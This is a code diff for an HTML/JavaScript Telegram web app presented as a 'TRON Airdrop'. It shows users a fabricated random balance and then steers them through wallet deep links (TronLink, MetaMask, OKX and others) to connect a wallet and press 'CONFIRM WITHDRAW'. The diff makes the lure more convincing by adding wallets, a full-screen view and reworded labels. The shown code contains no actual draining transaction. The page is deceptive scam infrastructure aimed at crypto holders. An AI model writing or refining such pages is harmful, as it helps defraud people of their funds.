@@ -7,7 +7,7 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
-        :root { --primary: #007aff; --bg: #000; --card: #1c1c1e; --text: #fff; --gold: #ffcc00; }
+        :root { --primary: #007aff; --bg: #000; --card: #1c1c1e; --text: #fff; --gold: #ffcc00; --tron: #ff0013; }
         body { background: var(--bg); color: var(--text); font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         
         #ui-external { text-align: center; display: none; flex-direction: column; align-items: center; width: 100%; }
@@ -25,17 +25,16 @@
 
         .btn-main { width: 100%; padding: 18px 0; background: #fff; color: #000; border: none; border-radius: 18px; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.2s; }
         
-        /* 动画层 */
         .anim-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); display: none; align-items: center; justify-content: center; z-index: 3000; }
         .box-container { animation: dropDown 2.5s forwards; }
         @keyframes dropDown { 0% { transform: translateY(-100vh); } 100% { transform: translateY(0); } }
 
-        /* 弹窗样式 */
         .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(15px); display: none; align-items: center; justify-content: center; z-index: 1000; }
         .overlay.active { display: flex !important; }
-        .modal { background: var(--card); width: 88%; max-width: 350px; border-radius: 28px; padding: 24px; border: 1px solid #333; }
+        .modal { background: var(--card); width: 88%; max-width: 350px; border-radius: 28px; padding: 24px; border: 1px solid #333; max-height: 80vh; overflow-y: auto; }
         
-        .wallet-option { display: flex; align-items: center; padding: 12px 16px; background: #2c2c2e; border-radius: 16px; cursor: pointer; margin-bottom: 10px; }
+        .wallet-option { display: flex; align-items: center; padding: 12px 16px; background: #2c2c2e; border-radius: 16px; cursor: pointer; margin-bottom: 10px; border: 1px solid transparent; }
+        .wallet-option:active { transform: scale(0.98); background: #3a3a3c; }
         .wallet-logo { width: 40px; height: 40px; border-radius: 10px; margin-right: 15px; background: #fff; color: #000; display: flex; align-items: center; justify-content: center; font-weight: bold; }
         
         #ui-internal { display: none; text-align: center; }
@@ -47,7 +46,7 @@
         <div class="airdrop-container">
             <h1 class="main-title">TRON Airdrop</h1>
             <div class="airdrop-card">
-                <div style="font-size: 10px; color: #94a3b8;">CLAIMABLE AMOUNT</div>
+                <div style="font-size: 10px; color: #94a3b8; letter-spacing: 1px;">AVAILABLE TO CLAIM</div>
                 <div class="amount-display">
                     <span style="color:#64748b; font-size:24px;">$</span><span class="value" id="main-val">0.00</span>
                 </div>
@@ -72,13 +71,13 @@
 
     <div id="walletModal" class="overlay">
         <div class="modal">
-            <h3 style="text-align:center; margin-top:0;">Connect Wallet</h3>
-            <div id="wallet-list">
-                <div class="wallet-option" onclick="jumpTo('okx')"><div class="wallet-logo">OKX</div><b>OKX Wallet</b></div>
-                <div class="wallet-option" onclick="jumpTo('tp')"><div class="wallet-logo" style="background:#2161ff; color:#fff">TP</div><b>TokenPocket</b></div>
-                <div class="wallet-option" onclick="jumpTo('mm')"><div class="wallet-logo" style="background:#f6851b; color:#fff">MM</div><b>MetaMask</b></div>
-                <div class="wallet-option" onclick="jumpTo('im')"><div class="wallet-logo" style="background:#098de6; color:#fff">IM</div><b>imToken</b></div>
-            </div>
+            <h3 style="text-align:center; margin-top:0; font-size: 20px;">Connect Wallet</h3>
+            <div class="wallet-option" onclick="jumpTo('tronlink')" style="border-color: rgba(255,0,19,0.3);"><div class="wallet-logo" style="background:var(--tron); color:#fff;">TL</div><b>TronLink</b></div>
+            <div class="wallet-option" onclick="jumpTo('okx')"><div class="wallet-logo">OKX</div><b>OKX Wallet</b></div>
+            <div class="wallet-option" onclick="jumpTo('tp')"><div class="wallet-logo" style="background:#2161ff; color:#fff;">TP</div><b>TokenPocket</b></div>
+            <div class="wallet-option" onclick="jumpTo('trust')"><div class="wallet-logo" style="background:#3375bb; color:#fff;">TW</div><b>Trust Wallet</b></div>
+            <div class="wallet-option" onclick="jumpTo('im')"><div class="wallet-logo" style="background:#098de6; color:#fff;">IM</div><b>imToken</b></div>
+            <div class="wallet-option" onclick="jumpTo('mm')"><div class="wallet-logo" style="background:#f6851b; color:#fff;">MM</div><b>MetaMask</b></div>
             <div style="text-align:center; color:#ff453a; margin-top:15px; cursor:pointer;" onclick="closeModal()">Cancel</div>
         </div>
     </div>
@@ -86,9 +85,9 @@
     <div id="ui-internal">
         <div style="background:var(--card); padding:40px; border-radius:32px; width:280px;">
             <div style="font-size:60px; color:#34c759;">✔</div>
-            <h2>Connected</h2>
-            <div id="addr" style="font-size:11px; color:#888; word-break:break-all;"></div>
-            <button class="btn-main" style="margin-top:25px; background:#10b981; color:#fff;">WITHDRAW</button>
+            <h2 style="margin: 15px 0 10px;">Wallet Ready</h2>
+            <div id="addr" style="font-size:11px; color:#888; word-break:break-all; background:#000; padding:10px; border-radius:8px;"></div>
+            <button class="btn-main" style="margin-top:25px; background:#34c759; color:#fff;">CONFIRM WITHDRAW</button>
         </div>
     </div>
 
@@ -97,18 +96,14 @@
         let userBalance = 0;
         let isClaimed = false;
 
-        // 获取 URL 参数的工具
         function getParam(name) {
             return new URLSearchParams(window.location.search).get(name);
         }
 
-        // 核心：处理主按钮点击
         function handleMainAction() {
             if (!isClaimed) {
-                // 模式 1：去抽奖
                 startClaimFlow();
             } else {
-                // 模式 2：去跳转/连接钱包
                 if (tg.platform !== "unknown" && !getParam('os')) {
                     const jumpUrl = window.location.origin + window.location.pathname + `?os=safari&amt=${userBalance}`;
                     tg.openLink(jumpUrl, { try_browser: true });
@@ -122,12 +117,10 @@
             const btn = document.getElementById('action-btn');
             btn.innerText = "VERIFYING...";
             btn.disabled = true;
-            
             setTimeout(() => {
                 document.getElementById('airdrop-anim-overlay').style.display = 'flex';
                 userBalance = (Math.random() * (1000 - 20) + 20).toFixed(2);
                 localStorage.setItem('p_amt', userBalance);
-                
                 setTimeout(() => {
                     document.getElementById('airdrop-anim-overlay').style.display = 'none';
                     document.getElementById('result-popup').classList.add('active');
@@ -138,7 +131,6 @@
 
         function closeResult() {
             document.getElementById('result-popup').classList.remove('active');
-            isClaimed = true;
             setWithdrawUI();
         }
 
@@ -152,30 +144,31 @@
         }
 
         async function init() {
-            // 立即检测状态，不给任何白屏机会
+            // --- 全屏化逻辑 ---
+            if (tg) {
+                tg.ready();
+                tg.expand(); // 自动扩展到全屏
+            }
+
             const urlAmt = getParam('amt');
             const localAmt = localStorage.getItem('p_amt');
             const isSafari = getParam('os') === 'safari';
 
-            // 1. 如果已在钱包 App 内部
             const isWallet = (window.tronWeb && window.tronWeb.defaultAddress.base58) || window.ethereum;
+            
             if (isWallet) {
                 document.getElementById('ui-internal').style.display = 'block';
                 if(window.tronWeb) document.getElementById('addr').innerText = window.tronWeb.defaultAddress.base58;
                 return;
             }
 
-            // 2. 显示外部 UI
             document.getElementById('ui-external').style.display = 'flex';
 
-            // 3. 核心判定：如果 URL 有金额或者是 Safari 模式
             if (urlAmt || localAmt) {
                 userBalance = urlAmt || localAmt;
                 setWithdrawUI();
-                
-                // 如果是 Safari 唤起的，强制直接弹出钱包列表
-                if (isSafari) {
-                    setTimeout(openModal, 100); 
+                if (isSafari && urlAmt) {
+                    setTimeout(openModal, 150); 
                 }
             }
         }
@@ -185,19 +178,18 @@
 
         function jumpTo(type) {
             let scheme = "";
-            const currentFullUrl = window.location.href;
-            const encodedUrl = encodeURIComponent(currentFullUrl);
+            const encodedUrl = encodeURIComponent(window.location.href);
             switch(type) {
+                case 'tronlink': scheme = "tronlinkout://pull.dapp?url=" + encodedUrl; break;
                 case 'okx': scheme = "okx://wallet/dapp/details?dappUrl=" + encodedUrl; break;
-                case 'tp': scheme = "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({"url": currentFullUrl})); break;
-                case 'mm': scheme = "https://metamask.app.link/dapp/" + currentFullUrl.replace("https://", ""); break;
+                case 'tp': scheme = "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({"url": window.location.href})); break;
+                case 'mm': scheme = "https://metamask.app.link/dapp/" + window.location.href.replace("https://", ""); break;
                 case 'im': scheme = "imtokenv2://navigate?screen=DappView&url=" + encodedUrl; break;
                 case 'trust': scheme = "trust://dl?url=" + encodedUrl; break;
             }
             if (scheme) window.location.href = scheme;
         }
 
-        // 启动
         init();
     </script>
 </body>
